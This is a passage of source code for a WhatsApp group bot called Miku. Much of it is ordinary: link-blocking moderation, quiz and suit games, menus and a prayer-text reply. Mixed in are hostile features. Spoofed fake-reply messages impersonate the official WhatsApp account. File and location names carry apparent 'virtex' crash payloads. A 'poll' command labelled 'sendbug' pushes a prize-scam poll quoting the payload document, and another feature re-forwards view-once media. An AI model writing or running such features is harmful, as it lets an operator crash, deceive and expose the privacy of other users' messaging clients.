        Miku.sendMessage(from, {text:`\`\`\`「  Antilink System  」\`\`\`\n\n@${kice.split("@")[0]} Baka has been removed for sending Yt channel link in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
        } else {
        }
        
        if (AntiLinkInstagram)
           if (budy.includes("https://www.instagram.com/")){
        if (!isBotAdmins) return
        bvl = `\`\`\`「  Antilink System  」\`\`\`\n\nLink sent by Admin so no action will be taken!`
        if (isAdmins) return reply(bvl)
        if (m.key.fromMe) return reply(bvl)
        if (isCreator) return reply(bvl)
        kice = m.sender
        await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
        Miku.sendMessage(from, {text:`\`\`\`「  Antilink System  」\`\`\`\n\n@${kice.split("@")[0]} Baka has been removed for sending Instagram link in this group! No promotion is allowed!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
        } else {
        }
        
        if (AntiLinkFacebook)
           if (budy.includes("https://facebook.com/")){
        if (!isBotAdmins) return
        bvl = `\`\`\`「  Antilink System  」\`\`\`\n\nLink sent by Admin so no action will be taken!`
        if (isAdmins) return reply(bvl)
        if (m.key.fromMe) return reply(bvl)
        if (isCreator) return reply(bvl)
        kice = m.sender
        await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
        Miku.sendMessage(from, {text:`\`\`\`「  Antilink System  」\`\`\`\n\n@${kice.split("@")[0]} Baka has been removed for sending Facebook link in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
        } else {
        }
        
        if (AntiLinkTelegram)
           if (budy.includes("https://t.me/")){
        if (AntiLinkTelegram)
        if (!isBotAdmins) return
        bvl = `\`\`\`「  Antilink System  」\`\`\`\n\nLink sent by Admin so no action will be taken!`
        if (isAdmins) return reply(bvl)
        if (m.key.fromMe) return reply(bvl)
        if (isCreator) return reply(bvl)
        kice = m.sender
        await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
        Miku.sendMessage(from, {text:`\`\`\`「  Antilink System  」\`\`\`\n\n@${kice.split("@")[0]} Baka has been removed for sending Telegram link in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
        } else {
        }
        
        if (AntiLinkTiktok)
           if (budy.includes("https://www.tiktok.com/")){
        if (!isBotAdmins) return
        bvl = `\`\`\`「  Antilink System  」\`\`\`\n\nLink sent by Admin so no action will be taken!`
        if (isAdmins) return reply(bvl)
        if (m.key.fromMe) return reply(bvl)
        if (isCreator) return reply(bvl)
        kice = m.sender
        await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
        Miku.sendMessage(from, {text:`\`\`\`「  Antilink System  」\`\`\`\n\n@${kice.split("@")[0]} Baka has been removed for sending Tiktok link in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
        } else {
        }
        
        if (AntiLinkTwitter)
           if (budy.includes("https://twitter.com/")){
        if (!isBotAdmins) return
        bvl = `\`\`\`「  Antilink System  」\`\`\`\n\nLink sent by Admin so no action will be taken!`
        if (isAdmins) return reply(bvl)
        if (m.key.fromMe) return reply(bvl)
        if (isCreator) return reply(bvl)
        kice = m.sender
        await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
        Miku.sendMessage(from, {text:`\`\`\`「  Antilink System  」\`\`\`\n\n@${kice.split("@")[0]} Baka has been removed for sending Twitter link in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
        } else {
        }
        
        if (AntiLinkAll)
           if (budy.includes("https://")){
        if (!isBotAdmins) return
        bvl = `\`\`\`「  Antilink System  」\`\`\`\n\nLink sent by Admin so no action will be taken!`
        if (isAdmins) return reply(bvl)
        if (m.key.fromMe) return reply(bvl)
        if (isCreator) return reply(bvl)
        kice = m.sender
        await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
        Miku.sendMessage(from, {text:`\`\`\`「  Antilink System  」\`\`\`\n\n@${kice.split("@")[0]} Baka has been removed for sending links in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
        } else {
        }
        
const deploy = (teks) => {
  Miku.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: global.Thumb }}}}, {})
}

const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `${global.OwnerName}â˜£ï¸${xeonbrutal(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}
}

const xezy = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "14169948404-1305080833@g.us" } : {}) 
},
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"externalAdReply": {
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": websitex,
"thumbnailUrl": 'https://i.ibb.co/txS3dDZ/Screenshot-2022-1030-154916.jpg', 
"thumbnail": xeonbugpic,
}}}

const bhosdike = (teks) => {
 Miku.sendMessage(m.chat, { image: xeonbugpic, caption: wm, contextInfo:{"externalAdReply": {"title": BotName,"body": global.OwnerName,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: websitex,
thumbnailUrl: 'https://i.ibb.co/txS3dDZ/Screenshot-2022-1030-154916.jpg', 
thumbnail: xeonbugpic,
}
}}, { quoted:xezy})
}

//emoji 
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI();
emoji.get(satu)
.then(emoji => {
const buttons = [{buttonId: "y", buttonText: {displayText:satu}, type: 1}]
const buttonMessage = {image: {url: emoji.images[dua].url},caption: "Here you go!",footerText: `${BotNane}`,buttons: buttons,headerType: 4}
Miku.sendMessage(from, buttonMessage, {quoted:m})
})
} catch (e) {
m.reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}
	
	
	
	
	
	
	
	
	
if (m.mtype == 'viewOnceMessage') {
	if (!db.data.chats[m.chat].antionce) return
 teks = `「 *Anti ViewOnce Message* 」
${themeemoji} Name : ${m.pushName}
${themeemoji} User : @${m.sender.split("@")[0]}
${themeemoji} Clock : ${moment.tz('Asia/Kolkata').format('HH:mm:ss')} 
${themeemoji} Date : ${moment.tz('Asia/Kolkata').format('DD/MM/YYYY')}
${themeemoji} MessageType : ${m.mtype}`
Miku.sendTextWithMentions(m.chat, teks, m)
await sleep(500)
m.copyNForward(m.chat, true, { readViewOnce: true }).catch(_ => reply(`Maybe it's been opened by a bot`))
}


if (!Miku.public) {
if (!m.key.fromMe) return
}


setInterval(() => {
fs.writeFileSync('./src/database.json', JSON.stringify(global.db, null, 2))
}, 60 * 1000)

// reset limit every 12 hours
let cron = require('node-cron')
    cron.schedule('00 12 * * *', () => {
    let user = Object.keys(global.db.users)
    let limitUser = isRakyat ? global.limitawal.rakyat : global.limitawal.free
    for (let jid of user) global.db.users[jid].limit = limitUser
    console.log('Reseted Limit')
    }, {
    scheduled: true,
    timezone: "Asia/Kolkata"
    })

    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
      kuis = true
      jawaban = tebaklagu[m.sender.split('@')[0]]
      if (budy.toLowerCase() == jawaban) {
      await Miku.sendImage(m.chat, 'https://telegra.ph/file/3971381526386eb43b41e.jpg', 'Wah Pinter banget kamu kak.\n\nJawabanmu benar 👏.', m)
      delete tebaklagu[m.sender.split('@')[0]]
      } else reply('*Tetott 🤭*')
      }

      if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
        kuis = true
        jawaban = tebakgambar[m.sender.split('@')[0]]
        if (budy.includes(jawaban)) {
        await Miku.sendImage(m.chat, 'https://telegra.ph/file/3971381526386eb43b41e.jpg', 'Wah Pinter banget kamu kak.\n\nJawabanmu benar 👏.', m)
        delete tebakgambar[m.sender.split('@')[0]]
        }else reply('*Tetott 🤭**')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
          kuis = true
          jawaban = tebakkata[m.sender.split('@')[0]]
          if (budy.includes(jawaban)) {
          await Miku.sendImage(m.chat, 'https://telegra.ph/file/3971381526386eb43b41e.jpg', 'Wah Pinter banget kamu kak.\n\nJawabanmu benar 👏.', m)
          delete tebakkata[m.sender.split('@')[0]]
          } else reply('*Tetott 🤭*')
          }
          
          if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
          kuis = true
          jawaban = caklontong[m.sender.split('@')[0]]
          deskripsi = caklontong_desk[m.sender.split('@')[0]]
          if (budy.includes(jawaban)) {
          await Miku.sendImage(m.chat, 'https://telegra.ph/file/3971381526386eb43b41e.jpg', 'Wah Pinter banget kamu kak.\n\nJawabanmu benar 👏.', m)
          delete caklontong[m.sender.split('@')[0]]
          delete caklontong_desk[m.sender.split('@')[0]]
          } else reply('*Tetott 🤭*')
          }
          
          if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
          kuis = true
          jawaban = tebakkalimat[m.sender.split('@')[0]]
          if (budy.includes(jawaban)) {
          await Miku.sendImage(m.chat, 'https://telegra.ph/file/3971381526386eb43b41e.jpg', 'Wah Pinter banget kamu kak.\n\nJawabanmu benar 👏.', m)
          delete tebakkalimat[m.sender.split('@')[0]]
          } else reply('*Tetott 🤭*')
          }
          
          if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
          kuis = true
          jawaban = tebaklirik[m.sender.split('@')[0]]
          if (budy.toLowerCase() == jawaban) {
          await Miku.sendImage(m.chat, 'https://telegra.ph/file/3971381526386eb43b41e.jpg', 'Wah Pinter banget kamu kak.\n\nJawabanmu benar 👏.', m)
          delete tebaklirik[m.sender.split('@')[0]]
          } else reply('*Tetott 🤭*')
          }
          
          if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
          kuis = true
          jawaban = tebaktebakan[m.sender.split('@')[0]]
          if (budy.toLowerCase() == jawaban) {
        await Miku.sendImage(m.chat, 'https://telegra.ph/file/3971381526386eb43b41e.jpg', 'Wah Pinter banget kamu kak.\n\nJawabanmu benar 👏.', m)
          delete tebaktebakan[m.sender.split('@')[0]]
          } else reply('*Tetott 🤭*')
          }
          
          if (('family100'+m.chat in _family100) && isCmd) {
          kuis = true
          let room = _family100['family100'+m.chat]
          let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
          let isSurender = /^((me)?give up|surr?ender|surrender)$/i.test(m.text)
          if (!isSurender) {
          let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
          if (room.terjawab[index]) return !0
          room.terjawab[index] = m.sender
          }
          let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
          let caption = `
          Answer the following questions :\n${room.soal}\n\n\nThere is ${room.jawaban.length} Answer ${room.jawaban.find(v => v.includes(' ')) ? `(some answers have spaces)` : ''}
          ${isWin ? `All Answers Answered` : isSurender ? 'Surrender!' : ''}
          ${Array.from(room.jawaban, (jawaban, index) => {
          return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
          }).filter(v => v).join('\n')}
          ${isSurender ? '' : `Perfect Player`}`.trim()
          Miku.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
          if (isWin || isSurender) delete _family100['family100'+m.chat]
          }
          
          
          this.suit = this.suit ? this.suit : {}
          let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
          if (roof) {
          let win = ''
          let tie = false
          if (m.sender == roof.p2 && /^(acc(ept)?|Setuju|gas|oke?|reject|Males|ogah|no(pe)?can|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
          if (/^(reject|Males|ogah|n|no(pe)?can)/i.test(m.text)) {
          Miku.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} Menolak suit, Suit Telah dibatalkan!`, m)
          delete this.suit[roof.id]
          return !0
          }
          roof.status = 'play'
          roof.asal = m.chat
          clearTimeout(roof.waktu)
          
          Miku.sendText(m.chat, `Pilihan Suit Telah Dikirimkan!
          @${roof.p.split`@`[0]} dan 
          @${roof.p2.split`@`[0]}
          Silahkan Cek Chat Pribadi Kalian"
          Click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
          if (!roof.pilih) Miku.sendText(roof.p, `Tolong Pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
          if (!roof.pilih2) Miku.sendText(roof.p2, `Tolong Pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
          roof.waktu_milih = setTimeout(() => {
          if (!roof.pilih && !roof.pilih2) Miku.sendText(m.chat, `Kedua Player Tidak Mau bermain,\nSuit Telah dibatalkan`)
          else if (!roof.pilih || !roof.pilih2) {
          win = !roof.pilih ? roof.p2 : roof.p
          Miku.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Tidak Memilih, Game Berakhir!`, m)
          }
          delete this.suit[roof.id]
          return !0
          }, roof.timeout)
          }
          let jwb = m.sender == roof.p
          let jwb2 = m.sender == roof.p2
          let g = /gunting/i
          let b = /batu/i
          let k = /kertas/i
          let reg = /^(gunting|batu|kertas)/i
          if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
          roof.pilih = reg.exec(m.text.toLowerCase())[0]
          roof.text = m.text
          reply(`Kamu Telah memilih ${m.text} ${!roof.pilih2 ? `\n\nTunggu Lawanmu Sedang Memilih...` : ''}`)
          if (!roof.pilih2) Miku.sendText(roof.p2, '_Pihak Lawan Telah Memilih!_\nSekarang Giliranmu!', 0)
          }
          if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
          roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
          roof.text2 = m.text
          reply(`Kamu Telah memilih ${m.text} ${!roof.pilih ? `\n\nTunggu Lawanmu Sedang Memilih...` : ''}`)
          if (!roof.pilih) Miku.sendText(roof.p, '_Pihak Lawan Telah Memilih!_\nSekarang Giliranmu!', 0)
          }
          let stage = roof.pilih
          let stage2 = roof.pilih2
          
          if (roof.pilih && roof.pilih2) {
            clearTimeout(roof.waktu_milih)
            if (b.test(stage) && g.test(stage2)) win = roof.p
            else if (b.test(stage) && k.test(stage2)) win = roof.p2
            else if (g.test(stage) && k.test(stage2)) win = roof.p
            else if (g.test(stage) && b.test(stage2)) win = roof.p2
            else if (k.test(stage) && b.test(stage2)) win = roof.p
            else if (k.test(stage) && g.test(stage2)) win = roof.p2
            else if (stage == stage2) tie = true
            Miku.sendText(roof.asal, `_*Suit Results*_${tie ? '\nDraw Bang!' : ''}
            @${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
            @${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost \n`}
            `.trim(), m, { mentions: [roof.p, roof.p2] })
            delete this.suit[roof.id]
            }
            }

            async function cerpen (category) {
              return new Promise((resolve, reject) => {
                  let title = category.toLowerCase().replace(/[()*]/g, "")
                  let judul = title.replace(/\s/g, "-")
                  let page = Math.floor(Math.random() * 5)
                  axios.get('http://cerpenmu.com/category/cerpen-'+judul+'/page/'+page)
                  .then((get) => {
                      let $ = cheerio.load(get.data)
                      let link = []
                      $('article.post').each(function (a, b) {
                          link.push($(b).find('a').attr('href'))
                      })
                      let random = link[Math.floor(Math.random() * link.length)]
                      axios.get(random)
                      .then((res) => {
                          let $$ = cheerio.load(res.data)
                          let hasil = {
                              title: $$('#content > article > h1').text(),
                              author: $$('#content > article').text().split('Short Story: ')[1].split('Category: ')[0],
                              kategori: $$('#content > article').text().split('Category: ')[1].split('\n')[0],
                              lolos: $$('#content > article').text().split('Passed moderation on: ')[1].split('\n')[0],
                              cerita: $$('#content > article > p').text()
                          }
                          resolve(hasil)
                      })
                  })
              })
          }

          if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
            await reply(`「 *Math Quiz* 」\n\n 🎉 Correct Answer 🎉\n\nWant to play again? send ${prefix}math mode`)
            delete kuismath[m.sender.split('@')[0]]
            } else reply('*Wrong answer!*')
            }

            if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
              let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
              let { text, mentionedJid } = hash
              let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
              userJid: Miku.user.id,
              quoted: m.quoted && m.quoted.fakeObj
              })
              messages.key.fromMe = areJidsSameUser(m.sender, Miku.user.id)
              messages.key.id = m.key.id
              messages.pushName = m.pushName
              if (m.isGroup) messages.participant = m.sender
              let msg = {
              ...chatUpdate,
              messages: [proto.WebMessageInfo.fromObject(messages)],
              type: 'append'
              }
              Miku.ev.emit('messages.upsert', msg)
              }
          


              const textImg = (teks) => {
                Miku.sendMessage(m.chat, { text :teks, }, {quoted: m, thumbnail: fs.readFileSync('./Assets/pic4.jpg')}) 
                }
                
               
             
                const ftoko = {
                key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
                },
                message: {
                "productMessage": {
                "product": {
                "productImage":{
                "mimetype": "image/jpeg",
                "jpegThumbnail": BotLogo
                },
                "title": `${global.OwnerName}`, 
                "description": `${global.BotName}`, 
                "currencyCode": "USD",
                "priceAmount1000": "2000",
                "retailerId": `${global.WaterMark}`,
                "productImageCount": 1
                },
                "businessOwnerJid": `0@s.whatsapp.net`
                }
                }
                }

                const fgi = {
                  key: { 
                        fromMe: false,
                       participant: `0@s.whatsapp.net`, ...(from ? 
                  { remoteJid: "916909137213-1613049930@g.us" } : {}) 
                               },
                  message: { 
                                "videoMessage": { 
                                "title": `Miku`,
                                "h": `Miku`,
                                'duration': '99999', 
                                'gifPlayback': 'true', 
                                'caption': `Fantox`,
                                'jpegThumbnail': fs.readFileSync('./Assets/miku.mp4')
                                       }
                                      }
                                   } 
//
crotol = await getBuffer (`https://telegra.ph/file/9c8909ec77adaf2ef1efb.jpg`)                                  
//faketest
const ftl = {
key: {
fromMe: false,
"participant":"0@s.whatsapp.net", 
"remoteJid": "916909137213-1604595598@g.us"},
"message": {orderMessage: {itemCount: 9999999,
status: 200,
thumbnail: crotol,
surface: 200, 
message: `Miuna Bot`,
orderTitle: 'Ri', 
sellerJid: '0@s.whatsapp.net'}}, 
contextInfo: {
"forwardingScore":999,"isForwarded":true},sendEphemeral: true}

//FAKEREPLY TROLI
const ftroli = {
  key : {
  participant : '0@s.whatsapp.net'
  },
  message: {
  orderMessage: {
  itemCount : 1,
  status: 1,
  surface : 1,
  message: `${global.OwnerName}`, 
  orderTitle: `${global.BotName}`,
  thumbnail: BotLogo, //Pic
  sellerJid: '0@s.whatsapp.net'
  
  }
  }
  }
  //FAKEREPLY LOCATION
  const flokasi = {
  key : {
   participant : '0@s.whatsapp.net'
  },
  message: {
  locationMessage: {
  name: `${virtex1} ${virtex2}`,
  jpegThumbnail: BotLogo
  }
  }
  }
  //FAKEREPLY DOCUMENT
  const fdocs = {
  key : {
   participant : '0@s.whatsapp.net'
  },
  message: {
  documentMessage: {
  title: `${global.BotName}`, 
  jpegThumbnail: BotLogo
  }
  }
  }
  //FAKEREPLY VIDEO
  const fvideo = {
  key: { 
  fromMe: false,
  participant: `0@s.whatsapp.net`, ...(from ? 
  { remoteJid: "916909137213-1613049930@g.us" } : {}) 
  },
  message: { 
  "videoMessage": { 
  "title": `${global.BotName}`,
  "h": `${global.OwnerName}`,
  'seconds': '30', 
  'caption': `${global.WaterMark}`,
  'jpegThumbnail': BotLogo
  }
  }
  }
  //FAKEREPLY GROUPINVITE
  const fgclink = {
  "key": {
  "fromMe": false,
  "participant": "0@s.whatsapp.net",
  "remoteJid": "0@s.whatsapp.net"
  },
  "message": {
  "groupInviteMessage": {
  "groupJid": "916909137213-1616169743@g.us",
  "inviteCode": `${global.OwnerName}`,
  "groupName": `${global.BotName}`, 
  "caption":`${global.WaterMark}`, 
  'jpegThumbnail': BotLogo
  }
  }
  }
  //FAKEREPLY GIF
  const fgif = {
  key: { 
  fromMe: false,
  participant: `0@s.whatsapp.net`, ...(from ? 
  { remoteJid: "916909137213-1613049930@g.us" } : {}) 
  },
  message: { 
   "videoMessage": { 
   "title":`${global.BotName}`,
   "h": `${global.OwnerName}`,
   'seconds': "30", 
   'gifPlayback': 'true', 
   'caption': `${global.WaterMark}`,
   'jpegThumbnail': BotLogo
  }
  }
  } 
  //FAKEREPLY TEXT WITH THUMBNAIL
  const ftextt = {
  key: { 
  fromMe: false,
  participant: `0@s.whatsapp.net`, ...(from ? 
  { remoteJid: "916909137213-1613049930@g.us" } : {}) 
  },
  message: { 
  "extendedTextMessage": {
   "text":`${global.OwnerName}`,
  "title": `${global.BotName}`,
   'jpegThumbnail': BotLogo
  }
  } 
  }
  //FAKEREPLY VN
  const fvn = {
key: { 
fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "status@broadcast" }) 
        }, 
message: { 
"audioMessage": {
"mimetype":"audio/ogg; codecs=opus",
"seconds": "400000271",
"ptt": "true"
}
} 
}
  l = 1
  monospace = '```'
  const timestampe = speed();
  const latensie = speed() - timestampe
  const levelMenu = getLevelingLevel(m.sender)
  const xpMenu = getLevelingXp(m.sender)
  const uangku = getBalance(m.sender, balance)
  const reqXp  = 200 * (Math.pow(2, getLevelingLevel(m.sender)) - 1)
  const jumlahUser = pendaftar.length
    if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
    if (!isInventory){ addInventori(m.sender) }
    if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }


    const menulist = `
    Konichiwa ${pushname} dear 👋. I am ${global.BotName}, a bot developed by: Fantox to take your WhatsApp usage into next level.
        
       「 System Info 」
    
    Speed : ${latensie.toFixed(4)} miliseconds
    Up Time : ${runtime(process.uptime())}
    Bot Name : ${global.BotName}
    Owner Name : ${global.OwnerName}
    𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : Amazon AWS
    𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿 : ${Object.keys(global.db.users).length}
    
    
       「 User Info 」
    
    User Level: ${levelMenu}
    User XP : ${xpMenu} \ ${reqXp}
    User Role : ${role}
    
    
       「 User Bank 」
    
    User Balance : ${uangku}
    Iron : ${getBesi(m.sender)}
    Gold : ${getEmas(m.sender)}
    Emarald : ${getEmerald(m.sender)}
    Potion : ${getPotion(m.sender)}
    
    
    Type *-menu* or press any button below to start using *${global.BotName}*
    
    ©️ *${global.BotName}* All Rights Reserved by: *Fantox*
    `
        const qtod = m.quoted? "true":"false"
        
        

function pickRandom(list) {
return list[Math.floor(list.length * Math.random())]
}
let documents = [doc1,doc2,doc3,doc4,doc5,doc6]
let docs = pickRandom(documents)
           

switch(command) {
	case 'kisahnabi':{
	if (isBan) return reply (mess.ban)
	if (!args[0]) return reply (`Masukan Nama Nabinya kak!\nContoh : ${prefix + command}`)
	ri = await fetchJson(`https://api.lolhuman.xyz/api/kisahnabi/${args.join(" ")}?apikey=${lolkey}`)
	let teks = `Nama : ${ri.result.name}
	Tahun Kelahiran : ${ri.result.thn_kelahiran}
	Tempat : ${ri.result.place}
	
	Kisahnya : ${ri.result.story}`
	let buttons = [{ buttonId : `${prefix}donasi`, buttonText: {displayText: `Sedekah kak!`}, type: 1 }]
	let buttonMessage ={
	document: fs.readFileSync('./Rimed/Ri.xlsx'),
	mimetype: doc5,
	fileName: `Kisah Nabi ${ri.result.name}`,
	fileLength: 99999999999999,
	caption : teks,
    footer : 'Miuna',
    buttons : buttons,
    headerType : 4
	}
	Miku.sendMessage(m.chat , buttonMessage , {quoted : m})
	}
	break
    case 'sc': case 'script': case 'sourcecode': {
        if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    teks = `*${global.BotName}'s Script*\n\n*GitHub*: ${global.BotSourceCode}\n\nDont forget to follow me on *GitHub* and give a ⭐️ to my projects. `
    let buttons = [
    {buttonId: `-menu`, buttonText: {displayText: '✨Bot Menu✨'}, type: 1}
    ]
    let buttonMessage = {
    image: Thumb,
    jpegThumbnail: BotLogo ,
    caption: teks,
    footer: `${BotName }`,
    buttons: buttons,
    headerType: 4,
    /*contextInfo:{externalAdReply:{
    title:"Powered by Fantox",
    body: " ", 
    thumbnail: fs.readFileSync("Assets/pic2.jpg"),
    mediaType:1,
    mediaUrl: 'https://wallpapercave.com/wp/wp10524580.jpg',
    sourceUrl: "https://wallpapercave.com/wp/wp10524580.jpg"
    }}*/

    }
    Miku.sendMessage(m.chat, buttonMessage, { quoted: m })
    }
    break
case 'niat' : case 'niatsholat' :
reply(` *1. Niat Sholat Subuh.*\n*Arabic :* اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى\n*Latin :* Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala.\n*Terjemahan :* Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala.\n\n*2. Niat Sholat Dzuhur.*\n*Arabic :* اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى\n*Latin :* Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala.\n*Terjemahan :* Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala.\n\n*3. Niat Sholat Ashar.*\n*Arabic :* اُصَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى\n*Latin :* Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala.\n*Terjemahan :* Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala.\n\n*4. Niat Sholat Maghrib.*\n*Arabic :* اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى\n*Latin :* Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala.\n*Terjemahan :* Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala.\n\n*5. Niat Sholat Isya.*\n*Arabic :* اُصَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى\n*Latin :* Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala.\n*Terjemahan :* Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala.`)

break

case 'antivirus': case 'antivirtex': {
   if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
if (!m.isGroup) return replay(mess.group)
if (!isBotAdmins) return replay(mess.botAdmin)
if (!isAdmins && !isCreator) return replay(mess.admin)
if (args[0] === "on") {
if (antiVirtex) return replay('Already activated')
ntvirtex.push(from)
replay('Success in turning on antivirus in this group')
var groupe = await Miku.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Miku.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return replay('Already deactivated')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
replay('Success in turning off antivirus this group')
} else {
  let buttonsntvirtex = [
  { buttonId: `${prefix + command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${prefix + command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await Miku.sendButtonText(m.chat, buttonsntvirtex, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break

//

case 'poll': {
if (!isCreator) return
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": BotName,
"options": [
	{
"optionName": "VOTE FOR PLEASURE"
	},
	{
"optionName": "VOTE AND WIN IPHONE 14 PRO MAX"
	},
	{
"optionName": "VOTE TO GET FREE +84 NUMBER"
	},
	{
"optionName": "VOTE TO GET +54"
	},
	{
"optionName": "VOTE TO GET +64"
	}
],
"selectableOptionsCount": 5
	}
}), { userJid: m.chat, quoted: doc })
Miku.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
deploy('Successful sendbug')
}
break
case 'thisbug': {
if (!isMod) return reply (mess.mod)
let teks = `â•â•âœªã€˜ *THIS IS A BUG BRO? â˜ºï¸* ã€™âœªâ•â•
